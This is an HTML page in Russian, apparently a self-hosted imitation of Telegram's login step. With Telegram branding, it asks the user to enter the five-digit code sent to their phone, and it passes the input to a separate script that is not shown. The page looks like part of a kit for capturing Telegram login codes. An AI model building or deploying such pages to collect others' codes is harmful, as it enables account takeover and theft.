<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка кода - Telegram Авторизация</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="container">
        <div class="auth-card">
            <div class="auth-header">
                <i class="fab fa-telegram telegram-icon"></i>
                <h1>Проверка кода</h1>
            </div>
            
            <form id="verifyForm" class="auth-form">
                <div class="form-group">
                    <label for="verification-code">Введите код из Telegram</label>
                    <div class="code-input-container">
                        <input type="text" id="verification-code" name="code" placeholder="• • • • •" maxlength="5" required>
                    </div>
                    <p class="form-hint">Код отправлен в Telegram на номер <span id="userPhone">+7 XXX XXX-XX-XX</span></p>
                </div>
                
                <div class="form-actions">
                    <button type="submit" class="btn-primary">
                        <i class="fas fa-check"></i> Подтвердить
                    </button>
                    <button type="button" id="resendCode" class="btn-secondary">
                        <i class="fas fa-sync-alt"></i> Отправить код повторно
                    </button>
                </div>
            </form>
            
            <div class="auth-footer">
                <p>Не получили код? <a href="/" class="link">Изменить номер телефона</a></p>
            </div>
        </div>
    </div>

    <script src="/verify-script.js"></script>
</body>
</html>
